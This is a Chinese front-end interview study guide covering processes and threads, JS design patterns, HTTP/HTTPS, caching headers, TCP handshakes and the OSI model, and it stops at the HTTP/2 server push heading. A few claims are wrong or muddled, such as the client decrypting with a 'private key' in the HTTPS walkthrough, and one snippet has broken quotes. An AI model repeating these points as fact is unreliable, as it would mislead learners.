# 面试克星！吐血整理前端面试要点难点基础版

> 前言：恰逢准备找新工作，整理个人学习以及在大厂面试中汇总的基础要点难点，覆盖从计算机基础到框架上层应用，随着前端知识覆盖面越来越广，很有必要在面试前将基础打好，攻克层层面试，仍在更新中，进阶难点版后期更新新文章，祝各位收割 offer。

## 零.计算机基础

### 1.线程与进程的区别

进程是资源分配的单位，而线程是系统调度的单位。进程的引入大大地提高了资源的利用率和系统的吞吐量，而引入线程的目的是为了减少程序并发所付出的系统开销。

1. 一个程序至少有一个进程,一个进程至少有一个线程
2. 线程的划分尺度小于进程，使得多线程程序的并发性高
3. 另外，进程在执行过程中拥有独立的内存单元，而多个线程共享内存，从而极大地提高了程序的运行效率
4. 线程在执行过程中与进程还是有区别的。每个独立的线程有一个程序运行的入口、顺序执行序列和程序的出口。但是线程不能够独立执行，必须依存在应用程序中，由应用程序提供多个线程执行控制
5. 从逻辑角度来看，多线程的意义在于一个应用程序中，有多个执行部分可以同时执行。但操作系统并没有将多个线程看做多个独立的应用，来实现进程的调度和管理以及资源分配。这就是进程和线程的重要区别

**操作系统中常见的进程调度策略有哪几种：**

FCFS(先来先服务)，

短作业(进程)优先调度算法，

高优先权优先调度算法

时间片轮转，

多队列、

多级反馈队列。

**进程间的通信IPC如何实现？**

现在最常见的进程间通信的方式有：

**信号：**信号是软件层次上对中断机制的一种模拟，是一种异步通信方式，信号可以在用户空间进程和内核之间直接交互，内核可以利用信号来通知用户空间的进程发生了哪些系统事件

**信号量：**信号量是一个计数器，用于多进程对共享数据的访问，信号量的意图在于进程间同步。

为了获得共享资源，进程需要执行下列操作：

（1）创建一个信号量：这要求调用者指定初始值，对于二值信号量来说，它通常是1，也可是0。

（2）等待一个信号量：该操作会测试这个信号量的值，如果小于0，就阻塞。也称为P操作。

（3）挂出一个信号量：该操作将信号量的值加1，也称为V操作。

**消息队列：**消息队列是存放在内核中的消息链表，消息队列在某个进程往一个队列写入消息之前，并不需要另外某个进程在该队列上等待消息的到达

**共享内存：**使得多个进程可以可以直接读写同一块内存空间，是最快的可用IPC形式。是针对其他通信机制运行效率较低而设计的。

**管道：****管**道是特殊类型的文件，在满足先入先出的原则条件下可以进行读写，但不能进行定位读写。管道是单向的，管道在打开时需要确实对方的存在，否则将阻塞

信号是使用信号处理器来进行的，信号量是使用P、V操作来实现的。消息队列是比较高级的一种进程间通信方法，因为它真的可以在进程间传送消息。

### 2.常见的设计模式

* **单例模式**

单例模式的定义是产生一个类的唯一实例，但js本身是一种“无类”语言。

如创建遮罩层：

```javascript
var createMask = function(){
  var mask;
  return function(){
       return mask || ( mask = document.body.appendChild( document.createElement('div') ) )
  }
}()
```
* **工厂模式**

简单工厂模式是由一个方法来决定到底要创建哪个类的实例, 而这些实例经常都拥有相同的接口. 这种模式主要用在所实例化的类型在编译期并不能确定， 而是在执行期决定的情况

* **观察者模式**

观察者模式( 又叫发布者-订阅者模式 )应该是最常用的模式之一. 在很多语言里都得到大量应用. 包括我们平时接触的dom事件. 也是js和dom之间实现的一种观察者模式.观察者模式可以很好的实现2个模块之间的解耦。

应用: 事件总线EventBus

```javascript
div.onclick  =  function click (){
   alert ( ''click' )
}
```
* **适配器模式**

适配器模式的作用很像一个转接口. 本来iphone的充电器是不能直接插在电脑机箱上的, 而通过一个usb转接口就可以了.

在程序里适配器模式也经常用来适配2个接口, 比如你现在正在用一个自定义的js库. 里面有个根据id获取节点的方法$id(). 有天你觉得jquery里的$实现得更酷, 但你又不想让你的工程师去学习新的库和语法. 那一个适配器就能让你完成这件事情.

* **装饰者模式**

装饰者模式是一种为函数或类增添特性的技术，它可以让我们在不修改原来对象的基础上，为其增添新的能力和行为。它本质上也是一个函数。

场景：

1. 如果你需要为类增添特性或职责，可是从类派生子类的解决方法并不太现实的情况下，就应该使用装饰者模式。
2. 在例子中，我们并没有对原来的Bicycle基类进行修改，因此也不会对原有的代码产生副作用。我们只是在原有的基础上增添了一些功能。因此，如果想为对象增添特性又不想改变使用该对象的代码的话，则可以采用装饰者模式。

例子：

1.防抖节流函数

2.装饰者模式除了可以应用在类上之外，还可以应用在函数上（其实这就是高阶函数）。比如，我们想测量函数的执行时间，那么我可以写这么一个装饰器。

* **代理模式**

代理模式的定义是把对一个对象的访问, 交给另一个代理对象来操作.

* **桥接模式**

桥接模式的作用在于将实现部分和抽象部分分离开来， 以便两者可以独立的变化。在实现api的时候， 桥接模式特别有用。比如最开始的singleton的例子.

```javascript
var singleton = function( fn ){
    var result;
    return function(){
        return result || ( result = fn .apply( this, arguments ) );
    }
}
var createMask = singleton( function(){
  return document.body.appendChild( document.createElement('div') );
})
```
另外一个常见的例子就是forEach函数的实现, 用来迭代一个数组.
可以看到, forEach函数并不关心fn里面的具体实现. fn里面的逻辑也不会被forEach函数的改写影响.

```javascript
forEach = function( ary, fn ){
  for ( var i = 0, l = ary.length; i < l; i++ ){
    var c = ary[ i ];
    if ( fn.call( c, i, c ) === false ){
      return false;
    }
   }
}
```
* **外观模式**

外观模式提供一个高层接口，这个接口使得客户端或子系统更加方便调用。

```javascript
var stopEvent = function( e ){   //同时阻止事件默认行为和冒泡
  e.stopPropagation();
  e.preventDefault();
}
```
* **访问者模式**

GOF官方定义： 访问者模式是表示一个作用于某个对象结构中的各元素的操作。它使可以在不改变各元素的类的前提下定义作用于这些元素的新操作。我们在使用一些操作对不同的对象进行处理时，往往会根据不同的对象选择不同的处理方法和过程。在实际的代码过程中，我们可以发现，如果让所有的操作分散到各个对象中，整个系统会变得难以维护和修改。且增加新的操作通常都要重新编译所有的类。因此，为了解决这个问题，我们可以将每一个类中的相关操作提取出来，包装成一个独立的对象，这个对象我们就称为访问者（Visitor）。利用访问者，对访问的元素进行某些操作时，只需将此对象作为参数传递给当前访问者，然后，访问者会依据被访问者的具体信息，进行相关的操作。

* **策略模式**

策略模式的意义是定义一系列的算法，把它们一个个封装起来，并且使它们可相互替换。

* **中介者模式**

中介者对象可以让各个对象之间不需要显示的相互引用，从而使其耦合松散，而且可以独立的改变它们之间的交互。

* **迭代器模式**

迭代器模式提供一种方法顺序访问一个聚合对象中各个元素，而又不需要暴露该方法中的内部表示。

js中我们经常会封装一个each函数用来实现迭代器。

* **组合模式**

组合模式又叫部分-整体模式，它将所有对象组合成树形结构。使得用户只需要操作最上层的接口，就可以对所有成员做相同的操作。

* **备忘录模式**

备忘录模式在js中经常用于数据缓存. 比如一个分页控件, 从服务器获得某一页的数据后可以存入缓存。以后再翻回这一页的时候，可以直接使用缓存里的数据而无需再次请求服务器。

### 3.HTTP/HTTPS，HTTP 状态码，HTTP缓存方案

**HTTP**：

是互联网上应用最为广泛的一种网络协议，是一个客户端和服务器端请求和应答的标准（TCP），用于从WWW服务器传输超文本到本地浏览器的传输协议，它可以使浏览器更加高效，使网络传输减少。

**HTTPS**：

是以安全为目标的HTTP通道，简单讲是HTTP的安全版，即HTTP下加入SSL层，HTTPS的安全基础是SSL，因此加密的详细内容就需要SSL。HTTPS协议的主要作用可以分为两种：一种是建立一个信息安全通道，来保证数据传输的安全；另一种就是确认网站的真实性。

**区别**：

1、https协议需要到ca申请证书，一般免费证书较少，因而需要一定费用。

2、http是超文本传输协议，信息是明文传输，https则是具有安全性的ssl加密传输协议。

3、http和https使用的是完全不同的连接方式，用的端口也不一样，前者是80，后者是443。

4、http的连接很简单，是无状态的；HTTPS协议是由SSL+HTTP协议构建的可进行加密传输、身份认证的网络协议，比http协议安全。

**HTTPS工作原理**

**客户端发起HTTPS请求**->**服务端配置**(采用HTTPS协议的服务器必须要有一套自己的的数据证书) ->**传送证书**(相当于公钥) ->**客户端解析证书**(由客户端TLS完成，验证公钥是否有效，如没有问题就生成一个随机值，然后用证书加密) ->**传送加密信息**(传送用证书加密后的随机值，相当于客户端与服务端通信的钥匙)->**服务端解密信息**(服务端用私钥解密随机值，并对请求内容通过该值进行对称加密) ->**传输加密后的信息**->**客户端解密信息**(客户端用之前生成的私钥解密服务端传回来的信息)

**建立连接过程**：

- HTTP使用TCP三次握手建立连接，客户端和服务器需要交换3个包

- HTTPS除了TCP的三个包，还要加上ssl握手需要的9个包，所以一共是12个包。

**HTTPS 优点：**

1.SEO方面

- Google搜索引擎中对于采用HTTPS加密的网站在搜索结果的排名将会更高。

2.安全性

- 尽管HTTPS并非绝对安全，掌握根证书的机构、掌握加密算法的组织同样可以进行中间人形式的攻击，但HTTPS仍是现行架构下最安全的解决方案，主要有以下几个好处：

（1）、使用HTTPS协议可认证用户和服务器，确保数据发送到正确的客户机和服务器；

（2）、HTTPS协议是由SSL+HTTP协议构建的可进行加密传输、身份认证的网络协议，要比http协议安全，可防止数据在传输过程中不被窃取、改变，确保数据的完整性。

（3）、HTTPS是现行架构下最安全的解决方案，虽然不是绝对安全，但它大幅增加了中间人攻击的成本。

**HTTPS的缺点**

1.SEO方面

- 使用HTTPS协议会使页面的加载时间延长近50%，增加10%到20%的耗电，此外，HTTPS协议还会影响缓存，增加数据开销和功耗，甚至已有安全措施也会受到影响也会因此而受到影响。

- 而且HTTPS协议的加密范围也比较有限，在黑客攻击、拒绝服务攻击、服务器劫持等方面几乎起不到什么作用。

2.经济方面

（1）、SSL证书需要钱，功能越强大的证书费用越高，个人网站、小网站没有必要一般不会用。

（2）、SSL证书通常需要绑定IP，不能在同一IP上绑定多个域名，IPv4资源不可能支撑这个消耗（SSL有扩展可以部分解决这个问题，但是比较麻烦，而且要求浏览器、操作系统支持，Windows XP就不支持这个扩展，考虑到XP的装机量，这个特性几乎没用）。

（3）、HTTPS连接缓存不如HTTP高效，大流量网站如非必要也不会采用，流量成本太高。

（4）、HTTPS连接服务器端资源占用高很多，支持访客稍多的网站需要投入更大的成本，如果全部采用HTTPS，基于大部分计算资源闲置的假设的VPS的平均成本会上去。

（5）、HTTPS协议握手阶段比较费时，对网站的相应速度有负面影响，如非必要，没有理由牺牲用户体验

### 4.HTTP 状态码

**http keep-alive**

非KeepAlive模式时，每个请求/应答客户和服务器都要新建一个连接，完成 之后立即断开连接（HTTP协议为无连接的协议）；当使用Keep-Alive模式（又称持久连接、连接重用）时，Keep-Alive功能使客户端到服 务器端的连接持续有效，当出现对服务器的后继请求时，Keep-Alive功能避免了建立或者重新建立连接。

* keep-Alive模式，客户端如何判断请求所得到的响应数据已经接收完成

对于非持续连接，浏览器可以通过连接是否关闭来界定请求或响应实体的边界；而对于持续连接，这种方法显然不奏效。有时，尽管我已经发送完所有数据，但浏览器并不知道这一点，它无法得知这个打开的连接上是否还会有新数据进来，

1.使用消息首部字段Conent-Length

Conent-Length表示实体内容长度，当客户端向服务器请求一个静态页面或者一张图片时，服务器可以很清楚的知道内容大小，然后通过Content-length消息首部字段告诉客户端 需要接收多少数据。

2.使用消息首部字段Transfer-Encoding（Transfer-Encoding: chunked ）

如果是动态页面等时，服务器是不可能预先知道内容大小。这时就可以使用Transfer-Encoding：chunk模式：服务器就需要使用Transfer-Encoding: chunked这样的方式来代替Content-Length。即如果要一边产生数据，一边发给客户端。数据分解成一系列数据块，并以一个或多个块发送，这样服务器可以发送数据而不需要预先知道发送内容的总大小。最后一个分块长度值必须为 0，对应的分块数据没有内容，表示实体结束。

Content-Encoding 和 Transfer-Encoding 二者经常会结合来用，其实就是针对 Transfer-Encoding 的分块再进行 Content-Encoding压缩。

**断开连接方式：**

* 如果服务端Response Header设置了`Keep-Alive:timeout={timeout}`，客户端会就会保持此连接timeout（单位秒）时间，超时之后关闭连接。
* 还有一种方式是接收端通在Response Header中增加`Connection close`标识，来主动告诉发送端，连接已经断开了，不能再复用了；客户端接收到此标示后，会销毁连接，再次请求时会重新建立连接。

100  Continue  继续，一般在发送post请求时，已发送了http header之后服务端将返回此信息，表示确认，之后发送具体参数信息

200  OK   正常返回信息

201  Created  请求成功并且服务器创建了新的资源

​202  Accepted  服务器已接受请求，但尚未处理

​301  Moved Permanently  请求的网页已永久移动到新位置。

​302 Found  临时性重定向。

​303 See Other  临时性重定向，且总是使用 GET 请求新的 URI。

​304  Not Modified  自从上次请求后，请求的网页未修改过。

​400 Bad Request  服务器无法理解请求的格式，客户端不应当尝试再次使用相同的内容发起请求。

​401 Unauthorized  请求未授权。

​403 Forbidden  禁止访问。

​404 Not Found  找不到如何与 URI 相匹配的资源。

500 Internal Server Error  最常见的服务器端错误。

​503 Service Unavailable 服务器端暂时无法处理请求（可能是过载或维护）。

### 5.HTTP缓存方案

关于缓存的使用这里介绍两套方案：expires/If-Modified-Since、Cache-Control/Etag；前者是HTTP1.0中的缓存方案，后者是HTTP1.1中缓存方案，若http头部中同时出现二者，后者的优先级更高。

Expires 和 max-age 都可以用来指定文档的过期时间，但是二者有一些细微差别

1. Expires在HTTP/1.0中已经定义，Cache-Control:max-age在HTTP/1.1中才有定义，为了向下兼容，仅使用max-age不够

2. Expires指定一个绝对的过期时间(GMT格式),这么做会导致至少2个问题：

2.1客户端和服务器时间不同步导致Expires的配置出现问题。

2.2很容易在配置后忘记具体的过期时间，导致过期来临出现浪涌现象

3. max-age 指定的是从文档被访问后的存活时间，这个时间是个相对值(比如:3600s)，相对的是文档第一次被请求时服务器记录的Request_time(请求时间)

4. Expires 指定的时间可以是相对文件的最后访问时间(Atime)或者修改时间(MTime)，而max-age相对对的是文档的请求时间(Atime)

5. 如果值为 no-cache,那么每次都会访问服务器。如果值为max-age，则在过期之前不会重复访问服务器。

它分为强缓存和协商缓存：

1）浏览器在加载资源时，先根据这个资源的一些http header判断它是否命中强缓存，强缓存如果命中，浏览器直接从自己的缓存中读取资源，不会发请求到服务器。比如某个css文件，如果浏览器在加载它所在的网页时，这个css文件的缓存配置命中了强缓存，浏览器就直接从缓存中加载这个css，连请求都不会发送到网页所在服务器；

2）当强缓存没有命中的时候，浏览器一定会发送一个请求到服务器，通过服务器端依据资源的另外一些http header验证这个资源是否命中协商缓存，如果协商缓存命中，服务器会将这个请求返回，但是不会返回这个资源的数据，而是告诉客户端可以直接从缓存中加载这个资源，于是浏览器就又会从自己的缓存中去加载这个资源；

3）强缓存与协商缓存的共同点是：如果命中，都是从客户端缓存中加载资源，而不是从服务器加载资源数据；区别是：强缓存不发请求到服务器，协商缓存会发请求到服务器。

4）当协商缓存也没有命中的时候，浏览器直接从服务器加载资源数据。

**强缓存**

是利用Expires或者Cache-Control这两个http response header实现的，它们都用来表示资源在客户端缓存的有效期。

缓存原理是：

1）浏览器第一次跟服务器请求一个资源，服务器在返回这个资源的同时，在respone的header加上Expires的header，如：

![图片](https://uploader.shimo.im/f/biqwITwnekd5sm8r.png!thumbnail?fileGuid=6vX3hWyqpyWTRwHj)

2）浏览器在接收到这个资源后，会把这个资源连同所有response header一起缓存下来（所以缓存命中的请求返回的header并不是来自服务器，而是来自之前缓存的header）；

3）浏览器再请求这个资源时，先从缓存中寻找，找到这个资源后，拿出它的Expires跟当前的请求时间比较，如果请求时间在Expires指定的时间之前，就能命中缓存，否则就不行。

4）如果缓存没有命中，浏览器直接从服务器加载资源时，Expires Header在重新加载的时候会被更新。

Expires是较老的强缓存管理header，由于它是服务器返回的一个绝对时间，在服务器时间与客户端时间相差较大时，缓存管理容易出现问题，比如随意修改下客户端时间，就能影响缓存命中的结果。所以在http1.1的时候，提出了一个新的header，就是Cache-Control，这是一个相对时间，在配置缓存的时候，以秒为单位，用数值表示，如：Cache-Control:max-age=315360000，它的缓存原理是：(与 expires类似)

Cache-Control描述的是一个相对时间，在进行缓存命中的时候，都是利用客户端时间进行判断，所以相比较Expires，Cache-Control的缓存管理更有效，安全一些。

这两个header可以只启用一个，也可以同时启用，当response header中，Expires和Cache-Control同时存在时，Cache-Control优先级高于Expires：

![图片](https://uploader.shimo.im/f/crvVOqgym9PEA2TJ.png!thumbnail?fileGuid=6vX3hWyqpyWTRwHj)

**强缓存的应用**

强缓存是前端性能优化最有力的工具，没有之一，对于有大量静态资源的网页，一定要利用强缓存，提高响应速度。通常的做法是，为这些静态资源全部配置一个超时时间超长的Expires或Cache-Control，这样用户在访问网页时，只会在第一次加载时从服务器请求静态资源，其它时候只要缓存没有失效并且用户没有强制刷新的条件下都会从自己的缓存中加载，比如前面提到过的京东首页缓存的资源，它的缓存过期时间都设置到了2026年：

然而这种缓存配置方式会带来一个新的问题，就是发布时资源更新的问题，比如某一张图片，在用户访问第一个版本的时候已经缓存到了用户的电脑上，当网站发布新版本，替换了这个图片时，已经访问过第一个版本的用户由于缓存的设置，导致在默认的情况下不会请求服务器最新的图片资源，除非他清掉或禁用缓存或者强制刷新，否则就看不到最新的图片效果。

**协商缓存**

当浏览器对某个资源的请求没有命中强缓存，就会发一个请求到服务器，验证协商缓存是否命中，如果协商缓存命中，请求响应返回的http状态为304并且会显示一个Not Modified的字符串，比如你打开京东的首页，按f12打开开发者工具，再按f5刷新页面，查看network，可以看到有不少请求就是命中了协商缓存的：

![图片](https://uploader.shimo.im/f/tvkWo2i2MFGz5n0l.png!thumbnail?fileGuid=6vX3hWyqpyWTRwHj)

查看单个请求的Response Header，也能看到304的状态码和Not Modified的字符串，只要看到这个就可说明这个资源是命中了协商缓存，然后从客户端缓存中加载的，而不是服务器最新的资源：

![图片](https://uploader.shimo.im/f/36vc7DlybdPDEKBN.png!thumbnail?fileGuid=6vX3hWyqpyWTRwHj)

协商缓存是利用的是【Last-Modified，If-Modified-Since】和【ETag、If-None-Match】这两对Header来管理的。

**【Last-Modified，If-Modified-Since】**的控制缓存的原理是：

1）浏览器第一次跟服务器请求一个资源，服务器在返回这个资源的同时，在respone的header加上Last-Modified的header，这个header表示这个资源在服务器上的最后修改时间：

![图片](https://uploader.shimo.im/f/wOMwrUBd5uknMM98.png!thumbnail?fileGuid=6vX3hWyqpyWTRwHj)

2）浏览器再次跟服务器请求这个资源时，在request的header上加上If-Modified-Since的header，这个header的值就是上一次请求时返回的Last-Modified的值：

![图片](https://uploader.shimo.im/f/uCv5y90qVgg8sfB8.png!thumbnail?fileGuid=6vX3hWyqpyWTRwHj)

3）服务器再次收到资源请求时，根据浏览器传过来If-Modified-Since和资源在服务器上的最后修改时间判断资源是否有变化，如果没有变化则返回304 Not Modified，但是不会返回资源内容；如果有变化，就正常返回资源内容。当服务器返回304 Not Modified的响应时，response header中不会再添加Last-Modified的header，因为既然资源没有变化，那么Last-Modified也就不会改变，这是服务器返回304时的response header：

![图片](https://uploader.shimo.im/f/VYrC7olb9iKOyEn6.png!thumbnail?fileGuid=6vX3hWyqpyWTRwHj)

4）浏览器收到304的响应后，就会从缓存中加载资源。

5）如果协商缓存没有命中，浏览器直接从服务器加载资源时，Last-Modified Header在重新加载的时候会被更新，下次请求时，If-Modified-Since会启用上次返回的Last-Modified值。

【Last-Modified，If-Modified-Since】都是根据服务器时间返回的header，一般来说，在没有调整服务器时间和篡改客户端缓存的情况下，这两个header配合起来管理协商缓存是非常可靠的，但是有时候也会服务器上资源其实有变化，但是最后修改时间却没有变化的情况，而这种问题又很不容易被定位出来，而当这种情况出现的时候，就会影响协商缓存的可靠性。所以就有了另外一对header来管理协商缓存，这对header就是【ETag、If-None-Match】。它们的缓存管理的方式是：

1）浏览器第一次跟服务器请求一个资源，服务器在返回这个资源的同时，在respone的header加上ETag的header，这个header是服务器根据当前请求的资源生成的一个唯一标识，这个唯一标识是一个字符串，只要资源有变化这个串就不同，跟最后修改时间没有关系，所以能很好的补充Last-Modified的问题：

![图片](https://uploader.shimo.im/f/gAPgFvkGoR5wcDoG.png!thumbnail?fileGuid=6vX3hWyqpyWTRwHj)

2）浏览器再次跟服务器请求这个资源时，在request的header上加上If-None-Match的header，这个header的值就是上一次请求时返回的ETag的值：

![图片](https://uploader.shimo.im/f/6UMaKXCn0P37iuj5.png!thumbnail?fileGuid=6vX3hWyqpyWTRwHj)

3）服务器再次收到资源请求时，根据浏览器传过来If-None-Match和然后再根据资源生成一个新的ETag，如果这两个值相同就说明资源没有变化，否则就是有变化；如果没有变化则返回304 Not Modified，但是不会返回资源内容；如果有变化，就正常返回资源内容。与Last-Modified不一样的是，当服务器返回304 Not Modified的响应时，由于ETag重新生成过，response header中还会把这个ETag返回，即使这个ETag跟之前的没有变化：

![图片](https://uploader.shimo.im/f/pPeUcT06OfpIDQJ9.png!thumbnail?fileGuid=6vX3hWyqpyWTRwHj)

4）浏览器收到304的响应后，就会从缓存中加载资源。

**协商缓存的管理**

协商缓存跟强缓存不一样，强缓存不发请求到服务器，所以有时候资源更新了浏览器还不知道，但是协商缓存会发请求到服务器，所以资源是否更新，服务器肯定知道。大部分web服务器都默认开启协商缓存，而且是同时启用【Last-Modified，If-Modified-Since】和【ETag、If-None-Match】，比如apache:

【Last-Modified，If-Modified-Since】和【ETag、If-None-Match】一般都是同时启用，这是为了处理Last-Modified不可靠的情况。有一种场景需要注意：

分布式系统里多台机器间文件的Last-Modified必须保持一致，以免负载均衡到不同机器导致比对失败；

分布式系统尽量关闭掉ETag(每台机器生成的ETag都会不一样）；

协商缓存需要配合强缓存使用，你看前面这个截图中，除了Last-Modified这个header，还有强缓存的相关header，因为如果不启用强缓存的话，协商缓存根本没有意义。

**其他：**

1）当ctrl+f5强制刷新网页时，直接从服务器加载，跳过强缓存和协商缓存；

2）当f5刷新网页时，跳过强缓存，但是会检查协商缓存；

**大公司的静态资源优化方案**，基本上要实现这么几个东西：

1. 配置超长时间的本地缓存 —— 节省带宽，提高性能

2. 采用内容摘要作为缓存更新依据 —— 精确的缓存控制

3. 静态资源CDN部署 —— 优化网络请求

4. 更资源发布路径实现非覆盖式发布 —— 平滑升级

### 6.TCP/UDP，有什么区别，说说三次握手四次挥手

IP是Internet Protocol的简称，是网络层的主要协议，作用是提供不可靠、无连接的数据报传送。

![图片](https://uploader.shimo.im/f/SnfYKIxYIJ2WC18Z.png!thumbnail?fileGuid=6vX3hWyqpyWTRwHj)

**TCP****：**可靠，稳定 TCP的可靠体现在TCP在传递数据之前，会有三次握手来建立连接，而且在数据传递时，有确认、窗口、重传、拥塞控制机制，在数据传完后，还会断开连接用来节约系统资源。TCP的缺点： 慢，效率低，占用系统资源高，易被攻击

（TCP的可靠传输是通过确认和超时重传的机制来实现的，而确认和超时重传的具体的实现是通过以字节为单位的**滑动窗口机制**来完成。虽然上层应用和TCP的交互是一次一个数据快(大小不等)，但是TCP把上层应用程序交付下来的数据看成仅仅是一串连续的无结构字节流。发送窗口:在为收到对方的ACK确认的情况下，只有发送窗口内的数据才能连续地发送出去。凡事已经发送过的数据，在未收到ACK确认之间都必须暂时保留在发送窗口内，以便超时重传使用。接收窗口:缓冲区，用来接收发送方的TCP数据段。**选择重传：**其只是选择性重发那些确实丢失的分组发送窗口的大小为m,接收窗口的大小为n。接收方先接收序号不连续的分组，并发送ACK确认，然后等待发送方重发丢失的分组(发送方每收到一个ACK确认就会关闭相应的定时器，最终没有收到ACK确认的分组的定时器超时，发送方会再次重发收到重发的分组后给予ACK确认，再对全部分组进行排序，最后交给上层应用。**流量控制：**TCP采用通知窗口实现对发送端的流量控制，通知窗口大小的单位是字节。TCP通过在TCP数据段首部的窗口字段中填入当前设定的接收窗口(即通知窗口)的大小，用来告知对方'我方当前的接收窗口大小'，以实现流量控制。通信双方的发送窗口大小由双方在连接建立是商定，在通信过程，双方可以动态地根据自己的情况调整对方的发送窗口大小。**拥塞控制：**TCP协议通过慢启动机制、拥塞避免机制、加速递减机制、快重传和快恢复机制来共同实现拥塞控制。**慢启动**通过逐步增大拥塞窗口的值来控制网络拥塞。拥塞窗口的初始值为1，每收到一个对发出的数据段的ACK确认，便将拥塞窗口的值增加1。随着传输轮次的增加，拥塞窗口的值会变得很大，因此TCP拥塞控制給慢启动增加一个阈值(又称慢启动门限)，当拥塞窗口>阈值时，就要进行尝试拥塞避免。当 拥塞窗口 < 阈值 时，使用慢启动算法，当 拥塞窗口 ＝ 阈值时，既可以使用慢启动算法，也可时使用拥塞避免算法。随着网络拥塞的出现和变化，阈值也会不断变化。TCP拥塞控制中，阈值的初始值为16。**拥塞避免**算法的思路是让拥塞窗口缓慢地增大，呈线性增长，即每完成一个传输轮次，拥塞窗口增加1。如果在使用慢启动机制或者拥塞避免机制中，发送数据时，出现了定时器超时，便执行**加速递减机制**:立刻将阈值限置为当前拥塞窗口大小的一半，然后拥塞窗口的值重置为1，执行使用慢启动机制）

**UDP****：**快，比TCP稍安全 UDP没有TCP的握手、确认、窗口、重传、拥塞控制等机制，UDP是一个无状态的传输协议，所以它在传递数据时非常快。没有TCP的这些机制，UDP较TCP被攻击者利用的漏洞就要少一些。缺点：不可靠，不稳定 因为UDP没有TCP那些可靠的机制，在数据传递时，如果网络质量不好，就会很容易丢包

常见使用TCP协议的应用如下： 浏览器，用的HTTP FlashFXP，用的FTP Outlook，用的POP、SMTP Putty，用的Telnet、SSH QQ文件传输

UDP： 当对网络通讯质量要求不高的时候，要求网络通讯速度能尽量的快，这时就可以使用UDP。 比如，日常生活中，常见使用UDP协议的应用如下： QQ语音 QQ视频 TFTP



**TCP传输的三次握手四次挥手策略**

为了准确无误地把数据送达目标处，TCP协议采用了三次握手策略。用TCP协议把数据包送出去后，TCP不会对传送    后的情况置之不理，它一定会向对方确认是否成功送达。握手过程中使用了TCP的标志：SYN和ACK。

发送端首先发送一个带SYN标志的数据包给对方。接收端收到后，回传一个带有SYN/ACK标志的数据包以示传达确认信息。最后，发送端再回传一个带ACK标志的数据包，代表“握手”结束。

若在握手过程中某个阶段莫名中断，TCP协议会再次以相同的顺序发送相同的数据包。

![图片](https://uploader.shimo.im/f/kb6BWo3CtOhF266v.png!thumbnail?fileGuid=6vX3hWyqpyWTRwHj)

1. 服务端进程准备好接收来自外部的 TCP 连接。然后服务端进程处于`LISTEN`状态，等待客户端连接请求。
2. 客户端向服务器发出连接请求，请求中首部同步位 SYN = 1，同时选择一个初始序号 sequence ，简写 seq = x。SYN 报文段不允许携带数据，只消耗一个序号。此时，客户端进入`SYN-SEND`状态。
3. 服务器收到客户端连接后，，需要确认客户端的报文段。在确认报文段中，把 SYN 和 ACK 位都置为 1 。确认号是 ack = x + 1，同时也为自己选择一个初始序号 seq = y。请注意，这个报文段也不能携带数据，但同样要消耗掉一个序号。此时，TCP 服务器进入`SYN-RECEIVED(同步收到)`状态。
4. 客户端在收到服务器发出的响应后，还需要给出确认连接。确认连接中的 ACK 置为 1 ，序号为 seq = x + 1，确认号为 ack = y + 1。TCP 规定，这个报文段可以携带数据也可以不携带数据，如果不携带数据，那么下一个数据报文段的序号仍是 seq = x + 1。这时，客户端进入`ESTABLISHED (已连接)`状态
5. 服务器收到客户的确认后，也进入`ESTABLISHED`状态。

这样三次握手建立连接的阶段就完成了，双方可以直接通信了。

断开一个TCP连接则需要“四次握手”：

* 第一次挥手：主动关闭方发送一个FIN，用来关闭主动方到被动关闭方的数据传送，也就是主动关闭方告诉被动关闭方：我已经不 会再给你发数据了(当然，在fin包之前发送出去的数据，如果没有收到对应的ack确认报文，主动关闭方依然会重发这些数据)，但是，此时主动关闭方还可 以接受数据。
* 第二次挥手：被动关闭方收到FIN包后，发送一个ACK给对方，确认序号为收到序号+1（与SYN相同，一个FIN占用一个序号）。
* 第三次挥手：被动关闭方发送一个FIN，用来关闭被动关闭方到主动关闭方的数据传送，也就是告诉主动关闭方，我的数据也发送完了，不会再给你发数据了。
* 第四次挥手：主动关闭方收到FIN后，发送一个ACK给被动关闭方，确认序号为收到序号+1，至此，完成四次挥手。

### 7.linux 的一些基本命令

企鹅厂比较喜欢问，考察认识的广度。

### 8.OSI 七层模型

应用层：应用层、表示层、会话层（从上往下）（HTTP、FTP、SMTP、DNS）

传输层（TCP和UDP）

网络层（IP）

物理和数据链路层（以太网）

每一层的作用如下：

物理层：通过媒介传输比特,确定机械及电气规范（比特Bit）RJ45 、 CLOCK 、 IEEE802.3 （中继器，集线器，网关

数据链路层：将比特组装成帧和点到点的传递（帧Frame）PPP 、 FR 、 HDLC 、 VLAN 、 MAC （网桥，交换机）

网络层：负责数据包从源到宿的传递和网际互连（包PackeT）IP 、 ICMP 、 ARP 、 RARP 、 OSPF 、 IPX 、 RIP 、 IGRP 、 （路由器）

传输层：提供端到端的可靠报文传递和错误恢复（段Segment）TCP 、 UDP 、 SPX

会话层：建立、管理和终止会话（会话协议数据单元SPDU）NFS 、 SQL 、 NETBIOS 、 RPC

表示层：对数据进行翻译、加密和压缩（表示协议数据单元PPDU）JPEG 、 MPEG 、 ASII

应用层：允许访问OSI环境的手段（应用协议数据单元APDU）FTP 、 DNS 、 Telnet 、 SMTP 、 HTTP 、 WWW 、 NFS

![图片](https://uploader.shimo.im/f/1er8ZGb4dOuA9WgH.png!thumbnail?fileGuid=6vX3hWyqpyWTRwHj)

各种协议

ICMP协议： 因特网控制报文协议。它是TCP/IP协议族的一个子协议，用于在IP主机、路由器之间传递控制消息。

TFTP协议： 是TCP/IP协议族中的一个用来在客户机与服务器之间进行简单文件传输的协议，提供不复杂、开销不大的文件传输服务。

HTTP协议： 超文本传输协议，是一个属于应用层的面向对象的协议，由于其简捷、快速的方式，适用于分布式超媒体信息系统。

DHCP协议： 动态主机配置协议，是一种让系统得以连接到网络上，并获取所需要的配置参数手段。

### 9.Http2.0

* **二进制分帧（Binary Format）**

流是连接中的一个虚拟信道，可以承载双向消息传输。每个流有唯一整数标识符。为了防止两端流ID冲突，客户端发起的流具有奇数ID，服务器端发起的流具有偶数ID。

在二进制分帧层上，http2.0会将所有传输信息分割为更小的消息和帧，并对它们采用二进制格式的编码将其封装，新增的二进制分帧层同时也能够保证http的各种动词，方法，首部都不受影响，兼容上一代http标准。其中，http1.X中的首部信息header封装到Headers帧中，而request body将被封装到Data帧中。

* **服务端推****送****（****S****erver****P****ush）**

